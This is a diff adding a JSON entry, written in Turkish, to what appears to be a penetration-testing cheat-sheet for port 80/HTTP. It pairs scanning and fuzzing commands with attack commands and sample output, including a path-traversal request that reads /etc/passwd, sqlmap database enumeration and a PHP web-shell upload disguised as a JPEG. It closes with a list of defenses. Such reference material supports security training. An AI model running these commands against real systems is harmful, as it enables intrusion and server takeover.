@@ -1,0 +1,81 @@
+{
+  "port": 80,
+  "service": "HTTP",
+  "protocol": "TCP",
+  "description": "HyperText Transfer Protocol — şifresiz web iletişimi. Web uygulama güvenlik açıklarının büyük çoğunluğu (SQLi, XSS, IDOR, RFI) bu port üzerinden sömürülür.",
+  "risk": "high",
+  "sections": [
+    {
+      "id": "enum",
+      "title": "HTTP Enumeration",
+      "commands": [
+        {
+          "label": "Nmap HTTP Script Taraması",
+          "command": "nmap -sV -p 80 --script http-title,http-headers,http-methods,http-robots.txt 192.168.1.105",
+          "description": "HTTP servisi tanımla, başlık, headerlar, HTTP metodlar ve robots.txt",
+          "output": "80/tcp open http Apache httpd 2.4.18\n| http-title: Company Intranet\n| http-methods: GET POST OPTIONS\n| http-robots.txt: 2 disallowed entries\n|   /admin /backup"
+        },
+        {
+          "label": "Nikto Web Tarayıcı",
+          "command": "nikto -h http://192.168.1.105 -C all",
+          "description": "Web sunucusunda bilinen zafiyet ve yanlış yapılandırmaları tara",
+          "output": "+ Server: Apache/2.4.18\n+ X-Content-Type-Options header not set\n+ OSVDB-3268: /admin/: Directory indexing found.\n+ OSVDB-3092: /backup/: Backup directory found."
+        },
+        {
+          "label": "Gobuster Dizin Keşfi",
+          "command": "gobuster dir -u http://192.168.1.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak -t 50",
+          "description": "Gizli dizin ve dosyaları brute force ile bul",
+          "output": "/admin   (Status: 301)\n/login.php (Status: 200)\n/backup  (Status: 403)"
+        },
+        {
+          "label": "ffuf Hızlı Fuzzing",
+          "command": "ffuf -u http://192.168.1.105/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -fc 404 -t 100",
+          "description": "ffuf ile hızlı dizin/dosya keşfi",
+          "tip": "ffuf çok daha hızlı — büyük wordlistler için tercih et"
+        },
+        {
+          "label": "Curl ile Header Analizi",
+          "command": "curl -sI http://192.168.1.105 | grep -E '(Server:|X-Powered|Content-Type|Set-Cookie)'",
+          "description": "HTTP response headerlarından teknoloji tespiti",
+          "output": "Server: Apache/2.4.18 (Ubuntu)\nX-Powered-By: PHP/7.0.33\nSet-Cookie: PHPSESSID=abc123; path=/"
+        }
+      ]
+    },
+    {
+      "id": "webapp",
+      "title": "Web Uygulama Testi",
+      "commands": [
+        {
+          "label": "SQLMap ile SQL Injection Testi",
+          "command": "sqlmap -u \"http://192.168.1.105/page.php?id=1\" --dbs --batch --level=3",
+          "description": "Senaryo: GET parametresinde SQL injection ara, veritabanlarını listele",
+          "output": "available databases:\n[*] information_schema\n[*] webapp"
+        },
+        {
+          "label": "Burp Suite Proxy",
+          "command": "# Tarayıcı: Proxy → 127.0.0.1:8080\n# Burp: Proxy > Intercept > On\n# Ardından Repeater'da isteği düzenle",
+          "description": "Senaryo: Burp ile HTTP isteğini yakala, manipüle et, tekrar gönder"
+        },
+        {
+          "label": "WFuzz Parametre Fuzzing",
+          "command": "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 http://192.168.1.105/page.php?FUZZ=test",
+          "description": "GET parametre adı keşfi — gizli parametreleri bul",
+          "output": "200 C   173W  892Ch  \"debug\"\n200 C   173W  892Ch  \"id\""
+        },
+        {
+          "label": "LFI Test",
+          "command": "curl 'http://192.168.1.105/page.php?file=../../../../etc/passwd'",
+          "description": "Senaryo: Local File Inclusion zafiyeti dene — /etc/passwd oku",
+          "output": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/bin/sh"
+        },
+        {
+          "label": "Webshell Yükleme Testi",
+          "command": "curl -F 'file=@shell.php;type=image/jpeg' http://192.168.1.105/upload.php",
+          "description": "Senaryo: PHP web shell'i JPEG olarak yükle — mimetype bypass",
+          "warning": "YALNIZCA yetkili lab ortamında kullanın."
+        }
+      ]
+    }
+  ],
+  "defenseNote": "HTTP güvenlik önlemleri: HTTPS kullanın (Let's Encrypt ücretsiz). Web Application Firewall (WAF) konuşlandırın (ModSecurity + OWASP CRS). Content Security Policy (CSP) ve diğer güvenlik headerları ekleyin (X-Content-Type-Options, X-Frame-Options). Directory listing'i kapatın (Apache: Options -Indexes). Hata mesajlarını kullanıcıya göstermeyin. Düzenli pentest ve DAST taramaları yapın."
+}
